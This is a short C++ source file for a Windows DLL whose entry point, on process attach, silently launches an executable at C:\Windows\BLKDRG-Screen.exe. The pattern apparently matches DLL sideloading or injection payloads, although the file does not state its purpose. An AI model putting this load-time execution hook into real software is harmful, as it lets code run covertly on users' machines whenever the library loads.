// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <process.h>
using namespace std;


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
		_spawnl(_P_WAIT, "C:\\Windows\\BLKDRG-Screen.exe", NULL);
	}
	return TRUE;
}

